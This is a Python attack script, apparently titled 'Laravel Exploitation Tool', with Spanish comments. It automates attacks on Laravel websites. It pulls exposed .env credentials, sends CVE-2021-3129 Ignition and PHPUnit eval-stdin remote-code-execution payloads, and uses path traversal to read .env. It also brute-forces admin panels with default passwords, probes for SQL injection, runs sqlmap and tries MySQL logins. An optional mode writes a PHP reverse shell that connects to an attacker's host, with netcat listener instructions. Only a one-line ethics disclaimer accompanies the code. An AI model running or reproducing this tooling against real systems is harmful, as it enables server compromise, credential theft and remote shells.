#!/usr/bin/env python3
import requests
import json
import base64
import hashlib
import hmac
import subprocess
import time
import sys
import argparse
from urllib.parse import quote

class LaravelExploiter:
    def __init__(self, target, app_key=None, db_user=None, db_pass=None, db_name=None):
        # Asegurar que el target tenga el formato correcto
        if not target.startswith(('http://', 'https://')):
            self.target = f"https://{target}"
        else:
            self.target = target
        
        self.app_key = app_key
        self.db_user = db_user
        self.db_pass = db_pass
        self.db_name = db_name
        
        # Headers para bypass
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "X-Forwarded-For": "127.0.0.1",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/json"
        }
        
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        
    def print_status(self, message):
        print(f"[*] {message}")
        
    def print_success(self, message):
        print(f"[+] {message}")
        
    def print_error(self, message):
        print(f"[-] {message}")

    # 1. Verificar .env expuesto
    def check_env_exposure(self):
        self.print_status("Verificando exposición de .env...")
        try:
            r = self.session.get(f"{self.target}/.env", timeout=10)
            if "APP_KEY" in r.text or "DB_PASSWORD" in r.text:
                self.print_success(".env EXPUESTO - Credenciales disponibles")
                print(f"[!] Contenido encontrado:\n{r.text[:500]}...")  # Mostrar solo primeros 500 chars
                return True
        except Exception as e:
            self.print_error(f"Error verificando .env: {e}")
        self.print_error(".env no accesible")
        return False

    # 2. Probar Laravel Ignition RCE
    def exploit_ignition(self):
        self.print_status("Probando Laravel Ignition RCE (CVE-2021-3129)...")
        payload = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "exploit",
                "viewFile": "php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log"
            }
        }
        try:
            r = self.session.post(f"{self.target}/_ignition/execute-solution", json=payload, timeout=10)
            if r.status_code == 200:
                self.print_success("Ignition RCE posible - CVE-2021-3129")
                return True
        except Exception as e:
            self.print_error(f"Error en Ignition RCE: {e}")
        return False

    # 3. Probar PHPUnit RCE
    def exploit_phpunit(self):
        self.print_status("Probando PHPUnit RCE...")
        php_code = "<?php system('whoami'); ?>"
        try:
            r = self.session.post(f"{self.target}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", 
                                 data=php_code, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=10)
            if r.status_code == 200 and len(r.text) > 0:
                self.print_success("PHPUnit RCE POSIBLE")
                self.print_success(f"Respuesta: {r.text.strip()}")
                return True
        except Exception as e:
            self.print_error(f"Error en PHPUnit RCE: {e}")
        return False

    # 4. Probar Livewire RCE
    def exploit_livewire(self):
        self.print_status("Probando Livewire RCE...")
        data = {
            "filename": "../../../.env"
        }
        try:
            r = self.session.post(f"{self.target}/livewire/preview-file", data=data, timeout=10)
            if r.status_code == 200:
                self.print_success("Livewire RCE posible")
                return True
        except Exception as e:
            self.print_error(f"Error en Livewire RCE: {e}")
        return False

    # 5. Fuerza bruta a paneles de administración
    def brute_force_panels(self):
        self.print_status("Iniciando fuerza bruta a paneles...")
        
        panels = ["administrator", "dashboard", "management", "admin", "login", "panel", "wp-admin", "backend", "cp"]
        users = ["admin", "administrator", "root", "user", "test"]
        passwords = ["admin", "password", "123456", "admin123", "1234", "password123"]
        
        # Agregar credenciales personalizadas si se proporcionaron
        if self.db_user:
            users.append(self.db_user)
        if self.db_pass:
            passwords.append(self.db_pass)
        
        for panel in panels:
            self.print_status(f"Probando panel: /{panel}")
            
            # Probar diferentes formatos de formulario
            form_fields = [
                "email=^USER^&password=^PASS^",
                "username=^USER^&password=^PASS^", 
                "user=^USER^&pass=^PASS^",
                "login=^USER^&password=^PASS^"
            ]
            
            for user in users:
                for password in passwords:
                    for fields in form_fields:
                        try:
                            data = fields.replace("^USER^", user).replace("^PASS^", password)
                            data_dict = {}
                            for pair in data.split("&"):
                                key, value = pair.split("=")
                                data_dict[key] = value
                            
                            r = self.session.post(f"{self.target}/{panel}", 
                                                data=data_dict,
                                                headers={"Content-Type": "application/x-www-form-urlencoded"},
                                                timeout=10,
                                                allow_redirects=False)
                            
                            if r.status_code in [200, 302] and "incorrect" not in r.text.lower() and "error" not in r.text.lower():
                                if len(r.text) > 500 or r.status_code == 302:  # Página cargada o redirección
                                    self.print_success(f"POSIBLE CREDENCIAL: {user}:{password} en /{panel}")
                                    return user, password, panel
                        except Exception as e:
                            continue
        return None, None, None

    # 6. Probar inyección SQL automática
    def sql_injection_scan(self):
        self.print_status("Buscando inyecciones SQL...")
        
        # Parámetros comunes a probar
        test_params = ["id", "product", "category", "search", "user", "email", "page", "post", "news"]
        payloads = [
            "1' AND '1'='1",
            "1' OR '1'='1", 
            "1' UNION SELECT 1,2,3-- -",
            "1' AND SLEEP(5)-- -"
        ]
        
        for param in test_params:
            for payload in payloads:
                try:
                    # Probar en URL
                    url = f"{self.target}/?{param}={quote(payload)}"
                    start_time = time.time()
                    r = self.session.get(url, timeout=10)
                    response_time = time.time() - start_time
                    
                    if "error" in r.text.lower() or "mysql" in r.text.lower() or "sql" in r.text.lower():
                        self.print_success(f"Posible SQLi en parámetro: {param}")
                        return param
                    
                    # Detectar time-based SQLi
                    if response_time > 5:
                        self.print_success(f"Posible SQLi time-based en parámetro: {param}")
                        return param
                        
                except:
                    pass
        return None

    # 7. Buscar archivos sensibles
    def find_sensitive_files(self):
        self.print_status("Buscando archivos sensibles...")
        
        files = [
            "/.env", "/.git/config", "/backup.sql", "/database.sqlite",
            "/storage/logs/laravel.log", "/phpinfo.php", "/config/database.php",
            "/.htaccess", "/web.config", "/robots.txt", "/sitemap.xml",
            "/composer.json", "/package.json", "/webpack.mix.js"
        ]
        
        found_files = []
        for file in files:
            try:
                r = self.session.get(f"{self.target}{file}", timeout=10)
                if r.status_code == 200:
                    self.print_success(f"Archivo encontrado: {file}")
                    found_files.append(file)
            except:
                pass
                
        return found_files

    # 8. Probar conexión MySQL (solo si se proporcionan credenciales)
    def test_mysql_connection(self):
        if not all([self.db_user, self.db_pass, self.db_name]):
            self.print_error("Credenciales de BD incompletas para probar MySQL")
            return False
            
        self.print_status("Probando conexión MySQL...")
        try:
            # Extraer host del target
            host = self.target.replace('https://', '').replace('http://', '').split('/')[0]
            
            # Usar subprocess para probar conexión directa
            result = subprocess.run([
                'mysql', '-h', host, '-u', self.db_user, f'-p{self.db_pass}',
                '-e', 'SHOW DATABASES;'
            ], capture_output=True, text=True, timeout=10)
            
            if "Database" in result.stdout:
                self.print_success("MySQL CONECTADO - Acceso directo posible")
                return True
        except Exception as e:
            self.print_error(f"MySQL no accesible: {e}")
            
        return False

    # 9. Ejecutar SQLMap automáticamente
    def run_sqlmap(self):
        self.print_status("Ejecutando SQLMap...")
        try:
            # Escaneo básico
            subprocess.run([
                'sqlmap', '-u', f"{self.target}", '--crawl=2', '--batch', '--level=3'
            ], timeout=120)
        except Exception as e:
            self.print_error(f"SQLMap error: {e}")

    # 10. Generar shell reverso
    def generate_reverse_shell(self, lhost, lport=4444):
        self.print_status("Generando payload de reverse shell...")
        
        # PHP Reverse Shell
        php_shell = f"""<?php
$sock=fsockopen("{lhost}",{lport});
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>"""
        
        # Guardar payload
        with open("shell.php", "w") as f:
            f.write(php_shell)
            
        self.print_success(f"Reverse shell generado: shell.php")
        self.print_status(f"Ejecuta: nc -lvnp {lport} antes de subir el shell")

    # Función principal que ejecuta todo
    def full_exploitation(self):
        self.print_status(f"INICIANDO EXPLOTACIÓN COMPLETA PARA: {self.target}")
        print("="*60)
        
        results = {}
        
        # Ejecutar todas las pruebas
        results['env_exposed'] = self.check_env_exposure()
        results['ignition_rce'] = self.exploit_ignition()
        results['phpunit_rce'] = self.exploit_phpunit()
        results['livewire_rce'] = self.exploit_livewire()
        results['sensitive_files'] = self.find_sensitive_files()
        results['sql_injection'] = self.sql_injection_scan()
        
        # Solo probar MySQL si tenemos credenciales
        if all([self.db_user, self.db_pass, self.db_name]):
            results['mysql_connection'] = self.test_mysql_connection()
        else:
            results['mysql_connection'] = False
        
        # Fuerza bruta
        user, password, panel = self.brute_force_panels()
        if user:
            results['credentials'] = (user, password, panel)
            self.print_success(f"CREDENCIALES ENCONTRADAS: {user}:{password} en /{panel}")
        
        # Resumen
        print("\n" + "="*60)
        self.print_status("RESUMEN DE EXPLOTACIÓN:")
        for test, result in results.items():
            if result:
                self.print_success(f"{test.upper()}: VULNERABLE")
            else:
                self.print_error(f"{test.upper()}: No vulnerable")
        
        # Recomendaciones
        print("\n" + "="*60)
        self.print_status("PRÓXIMOS PASOS RECOMENDADOS:")
        if results.get('credentials'):
            self.print_status(f"1. Acceder a: {self.target}/{results['credentials'][2]}")
            self.print_status(f"2. Usar credenciales: {results['credentials'][0]}:{results['credentials'][1]}")
        
        if results.get('mysql_connection'):
            host = self.target.replace('https://', '').replace('http://', '').split('/')[0]
            self.print_status(f"3. Conectar a MySQL: mysql -h {host} -u {self.db_user} -p{self.db_pass}")
        
        if any([results.get('ignition_rce'), results.get('phpunit_rce'), results.get('livewire_rce')]):
            self.print_status("4. RCE posible - Considerar usar exploits específicos")

def main():
    print("""
    🚀 LARAVEL EXPLOITATION TOOL
    ⚠️  SOLO PARA PRUEBAS ÉTICAS EN SISTEMAS AUTORIZADOS
    """)
    
    parser = argparse.ArgumentParser(description='Laravel Security Testing Tool')
    parser.add_argument('target', help='URL del objetivo (ej: ejemplo.com o https://ejemplo.com)')
    parser.add_argument('--app-key', help='APP_KEY de Laravel (opcional)')
    parser.add_argument('--db-user', help='Usuario de base de datos (opcional)')
    parser.add_argument('--db-pass', help='Contraseña de base de datos (opcional)')
    parser.add_argument('--db-name', help='Nombre de base de datos (opcional)')
    parser.add_argument('--shell', action='store_true', help='Generar reverse shell')
    
    args = parser.parse_args()
    
    exploiter = LaravelExploiter(
        target=args.target,
        app_key=args.app_key,
        db_user=args.db_user,
        db_pass=args.db_pass,
        db_name=args.db_name
    )
    
    if args.shell:
        lhost = input("Tu IP para reverse shell: ")
        lport = input("Puerto [4444]: ") or "4444"
        exploiter.generate_reverse_shell(lhost, int(lport))
    else:
        exploiter.full_exploitation()

if __name__ == "__main__":
    if len(sys.argv) == 1:
        print("Uso: python3 laravel_exploiter.py <URL> [opciones]")
        print("Ejemplo: python3 laravel_exploiter.py ejemplo.com")
        print("Ejemplo: python3 laravel_exploiter.py https://ejemplo.com --db-user admin --db-pass password")
        sys.exit(1)
    main()